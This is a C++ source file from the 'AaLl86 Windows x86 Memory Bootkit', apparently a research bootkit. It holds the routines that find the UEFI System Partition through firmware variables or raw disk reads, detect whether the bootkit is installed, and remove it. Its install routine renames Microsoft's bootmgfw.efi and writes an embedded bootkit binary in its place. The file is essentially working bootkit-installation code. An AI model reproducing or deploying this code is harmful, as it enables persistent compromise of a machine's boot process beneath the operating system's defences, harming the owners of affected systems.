/**********************************************************************
 * 
 *  AaLl86 Windows x86 Memory Bootkit
 *  Bootkit UEFI GPT disks setup routines module
 *	Last revision: 
 *
 *  Copyright© 2012 by AaLl86
 *	All right reserved
 * 
 **********************************************************************/

#include "stdafx.h"
#include "BootkitGptSetup.h"
#include "mbrdefs.h"
#include "VariousStuff.h"
#include <WinIoCtl.h>
#include "PeResource.h"

CBootkitGptSetup::CBootkitGptSetup(void) {
	g_pLog = new CLog();
	g_bIsMyOwnLog = true;
}

// Constructor with an initialized log
CBootkitGptSetup::CBootkitGptSetup(CLog & curLog) {
	g_pLog = &curLog;
	g_bIsMyOwnLog = false;
}

// Destructor
CBootkitGptSetup::~CBootkitGptSetup() {
	if (g_pLog && g_bIsMyOwnLog) delete g_pLog;
}

#pragma region UEFI system identification routine
// Get UEFI System Volume
LPTSTR CBootkitGptSetup::GetEfiSystemBootVolumeName() {
	BOOL retVal = 0;						// Win32 APIs returned value
	DWORD lastErr = 0;						// Last Win32 error
	GUID_PARTITION efiSysPart = {0};		// GUID partition obtained form UEFI firmware
	bool isGptPart = false;					// TRUE if found EFI System Partition is in GPT format
	LPTSTR curVolName = NULL;				// Current analysis volume name
	DWORD volNameMaxLen = 0;				// Current volume name buffer size (in TCHARs)
	DWORD volNameLen = 0;					// Current volume name string size
	DWORD curIdx = 1;						// Current volume index
	DWORD volDiskNumber = 0;				// Current Volume first physical disk number
	//HANDLE hSearch = NULL;					// Handle to search
	DWORD dwBytesRet = 0;					// Total number of bytes returned
	bool bFound = false;					// TRUE if I found EFI System volume

	// First thing I do is to examine system firmware and partitions ...
	// ... looking for UEFI System partition
	retVal = GetEfiSystemPartition(NULL, &efiSysPart, &isGptPart);
	if (!retVal || isGptPart == false) {
		g_pLog->WriteLine(L"CBootkitGptSetup has not found any UEFI System partition!");
		return NULL;
	}

	// Generate first volume name
	volNameMaxLen = 32;
	curVolName = new TCHAR[volNameMaxLen];
	wcscpy_s(curVolName, volNameMaxLen, L"\\\\.\\HarddiskVolume");
	volNameLen = wcslen(curVolName);

	// Partition found, now enumerate every volume of this system
	do {
		HANDLE hVol = NULL;					// Handle to target volume
		VOLUME_DISK_EXTENTS vde = {0};		// Current volume disk extents
		TCHAR idxStr[8] = {0};
		_itow_s(curIdx, idxStr, COUNTOF(idxStr), 10);
	
		// Append volume number to
		curVolName[volNameLen] = 0;
		wcscat_s(curVolName, volNameMaxLen, idxStr);

		// Step 1. Open target volume name
		hVol = CreateFile(curVolName, FILE_GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		lastErr = GetLastError();
		retVal = (lastErr != ERROR_FILE_NOT_FOUND);
		if (hVol != INVALID_HANDLE_VALUE)  {	
			retVal = DeviceIoControl(hVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, (LPVOID)&vde, sizeof(vde), &dwBytesRet, NULL);
			lastErr = GetLastError();
			if (retVal) {
				QWORD startLba = 0, endLba = 0;
				volDiskNumber = vde.Extents[0].DiskNumber;
				startLba = vde.Extents[0].StartingOffset.QuadPart / SECTOR_SIZE;
				endLba = startLba + (vde.Extents[0].ExtentLength.QuadPart / SECTOR_SIZE);
				if (startLba == efiSysPart.startLba && endLba == efiSysPart.endLba) 
					bFound = TRUE;
			} else
				g_pLog->WriteLine(L"CBootkitGptSetup::GetEfiSystemBootVolumeName - Warning: Unable to get volume disk extents"
				L" for \"%s\" volume. Last error: %i.", (LPVOID)curVolName, (LPVOID)lastErr);
			CloseHandle(hVol);
		}

		if (bFound) break;
		curIdx++;
	} while (retVal);

	if (bFound) {
		g_pLog->WriteLine(L"CBootkitGptSetup has found a valid UEFI System volume. Name \"%s\" - Disk number %i.",
			(LPVOID)curVolName, (LPVOID)volDiskNumber);
		return curVolName;
	} else {
		g_pLog->WriteLine(L"CBootkitGptSetup has not found any valid UEFI System volume.");
		delete[] curVolName;
		return NULL;
	}
};

// Get EFI System boot partition 
bool CBootkitGptSetup::GetEfiSystemPartition(LPTSTR devName, GUID_PARTITION * pSysPart, bool * pbIsGptPartition, bool bUseOnlyFirmware) {
	BOOL retVal = 0;						// Win32 APIs returned value
	DWORD lastErr = 0;						// Last Win32 error
	LPBYTE buff = NULL;						// Generic buffer
	DWORD buffSize = 0x400;					// Generic buffer size
	PEFI_LOAD_OPTION pLoadOption = NULL;			// EFI Load option structure returned from GetFirmwareEnvironmentVariable
	EFI_DEVICE_PATH_PROTOCOL * pDevPath = NULL;		// EFI Device path of Windows boot manager
	LPVOID optData = NULL;							// EFI optional data (WIndows BCD Entry GUID)
	TCHAR efiBootVarName[] =						// EFI Boot load variable name
		{L'B', L'o', L'o', L't', L'0', L'0', L'0', L'0', 0};
	WORD efiEntryNum = 0;							// EFI Boot loader entry number
	GUID_PARTITION sysPart = {0};					// GUID System partition
	BYTE signType = 0, partType = 0;				// EFI signature type and partition type
	DISK_GEOMETRY_EX diskGeom = {0};				// System boot disk geometry
	DWORD dwBytesRead = 0;							// Total number of bytes read
	bool bFound = FALSE;							// TRUE if I found system boot partition
	TCHAR tmpStr[0x10] = {0};
	size_t strLen = 0;
	
	// Do the following search only for non System drive
	while (!bFound && devName == NULL) {
		LPBYTE devPathBuff = NULL;

		// Allocate some memory for GetFirmwareEnvironmentVariable
		buff = new BYTE[buffSize];
		RtlZeroMemory(buff, buffSize);

		// Retrieve current boot variable name
		retVal = GetFirmwareEnvironmentVariable(L"BootCurrent",  EFI_GLOBAL_VARIABLE_GUID_STRING, buff, buffSize);
		lastErr = GetLastError();
		if (!retVal) break;

		// Now retrieve boot loader device path and options
		efiEntryNum = *((WORD*)buff);
		_ultow(efiEntryNum, tmpStr, 16);
		_wcsupr(tmpStr);
		strLen = wcslen(efiBootVarName) - wcslen(tmpStr);
		wcscpy_s(&efiBootVarName[strLen], COUNTOF(efiBootVarName) - strLen, tmpStr);
		retVal = GetFirmwareEnvironmentVariable(efiBootVarName,  EFI_GLOBAL_VARIABLE_GUID_STRING, buff, buffSize);
		lastErr = GetLastError();
		if (!retVal) break;

		pLoadOption = (PEFI_LOAD_OPTION)buff;
		pDevPath = (EFI_DEVICE_PATH_PROTOCOL*) ((LPBYTE)pLoadOption->Description + 
			(wcslen(pLoadOption->Description) + 1) * sizeof(TCHAR));
		optData = ((LPBYTE)pDevPath) + pLoadOption->FilePathListLength;

		// Now here analyze pDevPath
		if (!(pDevPath->Type == 4 && pDevPath->SubType == 1) ||			// Type: 4 - Media Device Path    Subtype: 1 – Hard Drive
			pDevPath->Length < 41)	break;
		devPathBuff = (LPBYTE)pDevPath;

		// Get signature type
		signType = devPathBuff[41];
		partType = devPathBuff[40];
		RtlZeroMemory(&sysPart, sizeof(sysPart));

		// Update partition information
		sysPart.u.partInfo.mustBeZero = 0;
		sysPart.u.partInfo.partNum = *((WORD*)&devPathBuff[0x04]);
		sysPart.u.partInfo.signatureType = signType;
		sysPart.u.partInfo.partFormat = partType;

		// Partition Data
		sysPart.startLba = *((QWORD*)&devPathBuff[0x08]);
		sysPart.endLba = sysPart.startLba + *((QWORD*)&devPathBuff[0x10]);
		g_pLog->WriteLine(L"CBootkitGptSetup has found a valid UEFI startup boot option: \"%s\". "
			L"UEFI Partition #%i - Start LBA: 0x%08x, End LBA: 0x%08x.", (LPVOID)pLoadOption->Description, 
			(LPVOID)sysPart.u.partInfo.partNum, (LPVOID)sysPart.startLba, (LPVOID)sysPart.endLba);

		// Signature
		RtlCopyMemory(&sysPart.uniqueId, &devPathBuff[24], sizeof(GUID));
		sysPart.partitionType = EFI_SYSTEM_PARTITION_GUID;
		bFound = true;
	};	

	// Delete used buffer
	if (buff) {delete[] buff; buff = NULL; }
	if (bFound) {
		if (pSysPart) *pSysPart = sysPart;
		if (pbIsGptPartition) *pbIsGptPartition = (sysPart.u.partInfo.partFormat == 0x02);
		return true;
	}
	if (bUseOnlyFirmware) return false;

	// If something goes wrong, then manually open system disk
	if (!devName) devName = L"\\\\.\\PhysicalDrive0";
	HANDLE hDrive = NULL;				// Physical drive handle
	DWORD bytesRead = 0;				// Number of bytes read

	hDrive = CreateFile(devName, FILE_GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) { 
		g_pLog->WriteLine(L"CBootkitGptSetup::GetEfiSystemPartition - Unable to open \"%s\" disk device for reading... Last error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		return false;
	}
	
	buffSize = 8192;			// First 16 sectors
	buff = (LPBYTE)VirtualAlloc(NULL, buffSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	RtlZeroMemory(buff, buffSize);
	// Read first 16 sectors
	retVal = ReadFile(hDrive, buff, buffSize, &bytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		CloseHandle(hDrive);		// We no longer need it
		VirtualFree(buff, 0, MEM_RELEASE);
		g_pLog->WriteLine(L"CBootkitGptSetup::GetEfiSystemPartition - Unable to read from \"%s\" disk device. Last error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		return false;
	}

	// Now analyze it
	DWORD totalDiskSector = 0;
	PARTITION_ELEMENT * pMbrSysPart = NULL;
	BYTE sysPartIdx = 0;
	PMASTER_BOOT_RECORD pMbr = (PMASTER_BOOT_RECORD) buff;
	// Get disk Geometry to obtain Total Disk Sector
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, 
		sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	CloseHandle(hDrive);		// We no longer need it

	if (retVal)				// If disk geometry is correctly obtained, use its data to refill totalDiskSector
		totalDiskSector = (DWORD)(diskGeom.DiskSize.QuadPart / diskGeom.Geometry.BytesPerSector);

	// Scan compatible Mbr searching for boot partition
	for (int i = 0; i < 4; i++) {
		PARTITION_ELEMENT & curElem = pMbr->PTable.Partition[i];
		if (!curElem.FileSystemType) continue;

		if (curElem.Bootable == 0x80 || 
			curElem.FileSystemType == EFI_GUID_PARTITION_FS_INDEX) {
			// Found botable partition
			pMbrSysPart = &curElem;
			sysPartIdx = (BYTE)i;
			break;
		}

		// Get last partition sector
		if (totalDiskSector <= (curElem.FreeSectorsBefore + curElem.TotalSectors)) 
			totalDiskSector = curElem.FreeSectorsBefore + curElem.TotalSectors;
	}

	if (!pMbrSysPart) {
		VirtualFree(buff, 0, MEM_RELEASE);
		g_pLog->WriteLine(L"CBootkitGptSetup::GetEfiSystemPartition - Unable to find EFI System partition on "
			L"\"%s\" disk device.", (LPVOID)devName);
		return false;
	}

	if (pMbrSysPart->FileSystemType != EFI_GUID_PARTITION_FS_INDEX  ||
		pMbrSysPart->TotalSectors < totalDiskSector - 0x20) {
		// Disk is not a GUID type
		signType = 0x01; partType = 0x01;
	} else {
		signType = 0x02; partType = 0x02;
	}

	// Now compile GUID_PARTITION structure
	sysPart.u.partInfo.partFormat = partType;
	sysPart.u.partInfo.signatureType = signType;
	if (partType == 0x02) {
		// UEFI Compatible MBR found, analyze each partition entry
		PGPT_PARTITION_HEADER pGptHdr = (PGPT_PARTITION_HEADER)(buff + SECTOR_SIZE);
		_ASSERT(pGptHdr->partEntriesStartLba == 2);

		if (memcmp(pGptHdr->signature, "EFI PART", sizeof(pGptHdr->signature)) != 0 ||
			pGptHdr->partEntriesStartLba > 15) {
			// Something is wrong here, what we should do???
			VirtualFree(buff, 0, MEM_RELEASE);
			return FALSE;
		}

		DWORD numOfEntries = pGptHdr->numOfPartitions;
		for (DWORD i = 0; i < numOfEntries; i++) {
			PGUID_PARTITION curPart = (PGUID_PARTITION)(buff +
				(pGptHdr->partEntriesStartLba * SECTOR_SIZE) + (i * pGptHdr->sizeOfPartEntry));
			if ((LPBYTE)curPart > (buff + buffSize)) break;			// Buffer overflow protection
			if (curPart->partitionType == EFI_SYSTEM_PARTITION_GUID) {
				// EFI System Partition found
				RtlCopyMemory(&sysPart, curPart, sizeof(GUID_PARTITION) - sizeof(curPart->u.partName));
				sysPart.u.partInfo.partNum = (WORD)i;
				bFound = true;
				break;
			}
		}
		if (pbIsGptPartition) *pbIsGptPartition = true;
		if (bFound)
			g_pLog->WriteLine(L"CBootkitGptSetup has found a valid UEFI system partition on device L\"%s\". "
			L"UEFI Partition #%i - Start LBA: 0x%08x, End LBA: 0x%08x.", (LPVOID)devName, 
			(LPVOID)sysPart.u.partInfo.partNum, (LPVOID)sysPart.startLba, (LPVOID)sysPart.endLba);

	} else {
		// This is a NON UEFI partition
		sysPart.u.partInfo.partNum = sysPartIdx;
		RtlZeroMemory(&sysPart.partitionType, sizeof(GUID));
		RtlZeroMemory(&sysPart.uniqueId, sizeof(GUID));
		sysPart.partitionType.Data1 = 0x0000AA55;		// MBR Signature type
		sysPart.startLba = (QWORD)pMbrSysPart->FreeSectorsBefore;
		sysPart.endLba = (QWORD)pMbrSysPart->TotalSectors + sysPart.startLba;
		if (pbIsGptPartition) *pbIsGptPartition = false;
		if (pMbrSysPart->FileSystemType == FAT32_MBR_FSTYPE || 
			pMbrSysPart->FileSystemType == FAT32LBA_MBR_FSTYPE) {
			bFound = true;
			g_pLog->WriteLine(L"CBootkitGptSetup has found a possible MBR compatible UEFI system partition on device L\"%s\". "
				L"MBR Partition #%i - Start LBA: 0x%08x, Total sectors: 0x%08x.", (LPVOID)devName, 
				(LPVOID)sysPartIdx, (LPVOID)pMbrSysPart->FreeSectorsBefore, (LPVOID)sysPart.endLba);
		}
	}

	// Perform cleanup 
	VirtualFree(buff, 0, MEM_RELEASE);
	return bFound;
}
#pragma endregion

#pragma region UEFI Bootkit identification routines
// Get if bootkit is currently installed in this System
BOOTKIT_STATE CBootkitGptSetup::GetBootkitState(LPTSTR volName, bool bIsRemovable) {
	DWORD lastErr = 0;					// Last Win32 error
	BOOL retVal = FALSE;				// Win32 API returned value
	TCHAR volNameCopy[0x30] = {0};		// Volume name copy
	DWORD strLen = 0;					// Generic string length
	TCHAR fsName[0x10] = {0};			// File system name
	LPTSTR fileName = NULL;				// X86 Memory bootkit filename

	// If no Volume name specified, query UEFI system volume
	if (!volName) {
		volName = GetEfiSystemBootVolumeName();
		if (!volName) return BOOTKIT_STATE_UNKNOWN;
		strLen = wcslen(volName);
		wcscpy_s(volNameCopy, COUNTOF(volNameCopy), volName);
		delete[] volName; volName = NULL;
	}
	else 
		wcscpy_s(volNameCopy, COUNTOF(volNameCopy), volName);

	// Add a trailing slash
	strLen = wcslen(volNameCopy);
	wcscat_s(volNameCopy, COUNTOF(volNameCopy), L"\\");

	// Verify target volume file System
	retVal = GetVolumeInformation (volNameCopy, NULL, 0, NULL, NULL, NULL, fsName, COUNTOF(fsName));
	if (retVal && wcsicmp(fsName, L"FAT32") != 0) 
		// Volume file system is not FAT32
		return BOOTKIT_NOT_PRESENT;

	// Create target Bootkit filename
	fileName = new TCHAR[MAX_PATH];
	RtlZeroMemory(fileName, MAX_PATH * sizeof(TCHAR));
	wcscat_s(fileName, MAX_PATH, volNameCopy);
	if (!bIsRemovable)
		// Fixed UEFI volume 
		wcscat_s(fileName, MAX_PATH, L"EFI\\Microsoft\\Boot\\bootmgfw.efi");
	else
		// Removable UEFI volume
		wcscat_s(fileName, MAX_PATH, L"EFI\\Boot\\bootia32.efi");

	// Open target filename and obtain version information
	CVersionInfo verInfo(fileName);
	lastErr = GetLastError();
	LPTSTR productName = NULL;				// Product name string (from bootmgfw.efi resources)
	LPTSTR companyName = NULL;
	if (!verInfo.IsCreated()) {
		// File not exists or error while opening file
		g_pLog->WriteLine(L"UEFI GetBootkitState - Unable to open UEFI boot manager file on volume \"%s\", "
			L"CVersionInfo Last error: %i.", (LPVOID)volNameCopy, (LPVOID)lastErr);
		return BOOTKIT_NOT_PRESENT;
	}

	// Get product and company name
	productName = verInfo.GetProductName();
	companyName = verInfo.GetCompanyName();

	// Free up file name memory
	delete[] fileName; fileName = NULL;

	if ((productName && (wcsstr(productName, L"Memory Bootkit") != NULL)) &&
		(companyName && (wcsncmp(companyName, COMPANYNAME, wcslen(COMPANYNAME)) == 0))) {
		LPTSTR verStr = verInfo.GetFileVersionString();
		g_pLog->WriteLine(L"UEFI GetBootkitState - Found AaLl86 x86 Memory bootkit version %s on \"%s\" volume.",
			(LPVOID)verStr, (LPVOID)volNameCopy);
		return BOOTKIT_INSTALLED;
	} 
	else {
		// No memory bootkit found
		g_pLog->WriteLine(L"UEFI GetBootkitState - Discovered %s UEFI %s on \"%s\" volume. No AaLl86 x86 Memory bootkit presence found.",
			(LPVOID)productName, (LPVOID)verInfo.QueryVersionValue(L"FileDescription"), (LPVOID)volNameCopy);
		return BOOTKIT_NOT_PRESENT;
	}
}
#pragma endregion

#pragma region Install / Remove routines
// Setup UEFI Bootkit to a particular volume
bool CBootkitGptSetup::InstallEfiBootkit(LPTSTR volName, bool bIsRemovable) {
	DWORD lastErr = 0;					// Last Win32 error
	BOOL retVal = FALSE;				// Win32 API returned value
	TCHAR volNameCopy[0x30] = {0};		// Volume name copy
	DWORD strLen = 0;					// Generic string length
	TCHAR fsName[0x10] = {0};			// File system name
	LPTSTR fileName = NULL;
	LPTSTR dotPtr = NULL;				// Generic dot pointer

	if (bIsRemovable) {
		// TODO: Implement removable UEFI setup
		DbgBreak();
		RaiseException(STATUS_NOT_IMPLEMENTED, EXCEPTION_NONCONTINUABLE_EXCEPTION, 0, NULL);
	}

	// If no Volume name specified, query UEFI system volume
	if (!volName) {
		volName = GetEfiSystemBootVolumeName();
		if (!volName) return false;
		strLen = wcslen(volName);
		wcscpy_s(volNameCopy, COUNTOF(volNameCopy), volName);
		delete[] volName; volName = NULL;
	}
	else 
		wcscpy_s(volNameCopy, COUNTOF(volNameCopy), volName);

	// Add a trailing slash
	strLen = wcslen(volNameCopy);
	wcscat_s(volNameCopy, COUNTOF(volNameCopy), L"\\");

	// Verify target volume file System
	retVal = GetVolumeInformation (volNameCopy, NULL, 0, NULL, NULL, NULL, fsName, COUNTOF(fsName));
	if (retVal && wcsicmp(fsName, L"FAT32") != 0) {
		// Volume file system is not FAT32, abort setup
		g_pLog->WriteLine(L"InstallEfiBootkit - Unable to get UEFI Boot volume file system. Last error: %i.",
			(LPVOID)GetLastError());
		return false;
	}

	// Now open and analyze L"bootmgfw.efi"
	fileName = new TCHAR[MAX_PATH];
	RtlZeroMemory(fileName, MAX_PATH * sizeof(TCHAR));
	wcscat_s(fileName, MAX_PATH, volNameCopy);
	wcscat_s(fileName, MAX_PATH, L"EFI\\Microsoft\\Boot\\bootmgfw.efi");

	// Get version information of target file
	CVersionInfo verInfo(fileName);
	LPTSTR productName = NULL;				// Product name string (from bootmgfw.efi resources)
	LPTSTR companyName = NULL;
	if (!verInfo.IsCreated()) {
		g_pLog->WriteLine(L"InstallEfiBootkit - Unable to open and analyze original Microsoft Boot manager, CVersionInfo has failed!");
		delete[] fileName;
		return false;
	}

	productName = verInfo.GetProductName();
	companyName = verInfo.GetCompanyName();

	if ((productName && (wcsstr(productName, L"Memory Bootkit") != NULL)) &&
		(companyName && (wcsncmp(companyName, COMPANYNAME, wcslen(COMPANYNAME)) == 0))) {
		// a previous version of our bootkit is installed. Stop procedure!
		// User MUST remove previous version before install this one
		LPTSTR verStr = verInfo.GetFileVersionString();
		g_pLog->WriteLine(L"CBootkitGptSetup::InstallEfiBootkit - Error. A copy of Memory bootkit version %s is already installed in this system."
			L" If you would like to update it, please remove it first.", verStr);
		delete[] fileName;
		return false;
	}

	_ASSERT(wcsicmp(companyName, L"Microsoft Corporation") == 0);
	_ASSERT(wcsstr(productName, L"Windows") != NULL);

	// Rename old original boot manager
	LPTSTR newFileName = NULL;
	strLen  = wcslen(fileName) + 10;
	newFileName = new TCHAR[strLen];
	wcscpy_s(newFileName, strLen, fileName);
	dotPtr = wcsrchr(newFileName, L'.');
	if (!dotPtr) {
		g_pLog->WriteLine(L"Internal error :-( I'm totally drunken. Call Saferbytes please!! Aborting everything...");
		delete[] fileName; delete[] newFileName; return false;
	}
	dotPtr[0] = 0;
	wcscat_s(newFileName, strLen, L"_org.efi");
	retVal = MoveFile(fileName, newFileName);
	lastErr = GetLastError();
	if (retVal) {
		g_pLog->WriteLine(L"CBootkitGptSetup::InstallEfiBootkit - Successfully renamed original Windows UEFI Boot manager (new name: %s).", 
			(LPVOID)(wcsrchr(newFileName, L'\\') + 1));
	}
	else {
		g_pLog->WriteLine(L"CBootkitGptSetup::InstallEfiBootkit - Error, unable to move original Windows UEFI Boot manager."
			L" Last error: %i",	(LPVOID)lastErr);
		delete[] newFileName; delete[] fileName; 
		return false;
	}

	// Now extract new UEFI boot manager
	retVal = CPeResource::Save(MAKEINTRESOURCE(IDR_BINUEFI), L"BINARY", fileName, true);
	lastErr = GetLastError();
	if (retVal)
		g_pLog->WriteLine(L"CBootkitGptSetup::InstallEfiBootkit - Successfully written Memory bootkit to \"%s\" file.", 
			(LPVOID)(wcsrchr(fileName, L'\\') + 1));
	else {
		g_pLog->WriteLine(L"CBootkitGptSetup::InstallEfiBootkit - Unable to write new Memory bootkit file. "
			L"CPeResource::Save has failed with error %i.", (LPVOID)lastErr);
		// Restore old situation
		MoveFile(newFileName, fileName);
	}

	// TODO: Place here Memory bootkit customization code

	// Free up resources
	delete[] newFileName; newFileName = NULL;
	delete[] fileName; fileName = NULL;
	return (retVal == TRUE);
}

// Remove UEFI Bootkit from a particular volume
bool CBootkitGptSetup::RemoveEfiBootkit(LPTSTR volName, bool bIsRemovable) {
	DWORD lastErr = 0;					// Last Win32 error
	BOOL retVal = FALSE;				// Win32 API returned value
	TCHAR volNameCopy[0x30] = {0};		// Volume name copy
	DWORD strLen = 0;					// Generic string length
	LPTSTR fileName = NULL;				// Target UEFI bootkit filename
	LPTSTR orgBootMgrName = NULL;		// Original Windows Boot Manager filename
	LPTSTR dotPtr = NULL;				// Generic dot pointer
	bool fExists = false;				// "true" if target file exists

	// If no Volume name specified, query UEFI system volume
	if (!volName) {
		volName = GetEfiSystemBootVolumeName();
		if (!volName) return false;
		strLen = wcslen(volName);
		wcscpy_s(volNameCopy, COUNTOF(volNameCopy), volName);
		delete[] volName; volName = NULL;
	}
	else 
		wcscpy_s(volNameCopy, COUNTOF(volNameCopy), volName);

	// Create target Bootkit filename
	fileName = new TCHAR[MAX_PATH];
	RtlZeroMemory(fileName, MAX_PATH * sizeof(TCHAR));
	wcscat_s(fileName, MAX_PATH, volNameCopy);
	if (!bIsRemovable) {
		// Fixed UEFI volume 
		wcscat_s(fileName, MAX_PATH, L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
		
		// Generate original Microsoft boot manager filename
		orgBootMgrName = new TCHAR[MAX_PATH];
		wcscpy_s(orgBootMgrName, MAX_PATH, fileName);
		dotPtr = wcsrchr(orgBootMgrName, L'.');
		if (dotPtr) dotPtr[0] = 0;
		wcscat_s(orgBootMgrName, MAX_PATH, L"_org.efi");

		if (!FileExist(orgBootMgrName)) {
			LPTSTR efiPath = fileName + wcslen(volNameCopy);
			dotPtr = wcsrchr(fileName, L'\\');
			if (dotPtr) *(dotPtr++) = 0;
			g_pLog->WriteLine(L"RemoveEfiBootkit - Unable to locate original UEFI Windows Boot manager file. "
				L"You have to manually restore \"%s\" file located in \"%s\" path of UEFI boot partition. Aborting...", 
				(LPVOID)dotPtr, (LPVOID)efiPath);
			delete[] orgBootMgrName; orgBootMgrName = NULL;
		}
	} else
		// Removable UEFI volume
		wcscat_s(fileName, MAX_PATH, L"\\EFI\\Boot\\bootia32.efi");

	// Check if target file exists
	fExists = FileExist(fileName);
	if (!fExists || (!bIsRemovable && !orgBootMgrName)) {
		if (!fExists)
			g_pLog->WriteLine(L"RemoveEfiBootkit - Unable to locate UEFI boot manager file on \"%s\" volume.", (LPVOID)volNameCopy);
		if (fileName) delete[] fileName; 
		if (orgBootMgrName) delete[] orgBootMgrName;
		return false;
	}

	// Actual remove process code Begin
	if (!bIsRemovable) {
		retVal = CopyFile(orgBootMgrName, fileName, FALSE);
		if (retVal) DeleteFile(orgBootMgrName);
	} else {
		retVal = DeleteFile(fileName);
		if (retVal) {
			// Remove \EFI\Boot directory
			dotPtr = wcsrchr(fileName, L'\\');
			if (dotPtr) dotPtr[0] = 0;
			RemoveDirectory(fileName);
			// Remove \EFI directory
			dotPtr = wcsrchr(fileName, L'\\');
			if (dotPtr) dotPtr[0] = 0;
			RemoveDirectory(fileName);
		}
	}
		
	lastErr = GetLastError();
	if (retVal) 
		g_pLog->WriteLine(L"RemoveEfiBootkit - Successfully removed AaLl86 X86 UEFI Memory bootikit from volume \"%s\".",
			(LPVOID)volNameCopy);
	else
		g_pLog->WriteLine(L"RemoveEfiBootkit - Unable to delete X86 UEFI Memory bootkit from volume \"%s\", "
			L"Last error: %i.", (LPVOID)volNameCopy, (LPVOID)lastErr);
	
	// Free up resources
	if (fileName) {delete[] fileName; fileName = NULL; }
	if (orgBootMgrName) {delete[] orgBootMgrName; orgBootMgrName = NULL; }
	return (retVal == TRUE);
}
#pragma endregion
